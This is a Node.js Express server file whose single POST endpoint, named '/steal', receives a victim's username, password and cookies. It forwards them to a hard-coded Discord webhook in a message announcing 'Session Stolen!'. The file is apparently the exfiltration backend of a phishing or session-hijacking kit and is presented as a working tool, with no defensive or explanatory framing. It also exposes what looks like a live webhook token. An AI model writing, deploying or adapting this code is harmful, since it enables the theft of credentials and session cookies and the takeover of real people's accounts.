const express = require('express');
const app = express();
const path = require('path');

// Your Discord Webhook URL
const WEBHOOK_URL = "https://discord.com/api/webhooks/1576170466010464266/7QB8st24XuNRLNg49W4FQqqB9x-o02LrISZhwCZcRfj73HQRk8KFb0Iebs9pvx7wTTGn";

app.use(express.json());
app.use(express.static('public'));

app.post('/steal', async (req, res) => {
    const { user, pass, cookies } = req.body;

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: `🔓 **Session Stolen!**\n\n**User:** ${user}\n**Password:** ${pass}\n\n**Cookies:**\n\`\`\`${cookies}\`\`\``
            })
        });
    } catch (error) {
        console.error('Error sending to Discord:', error);
    }

    res.send('OK');
});

app.listen(3000, () => {
    console.log('Server is running on port 3000');
});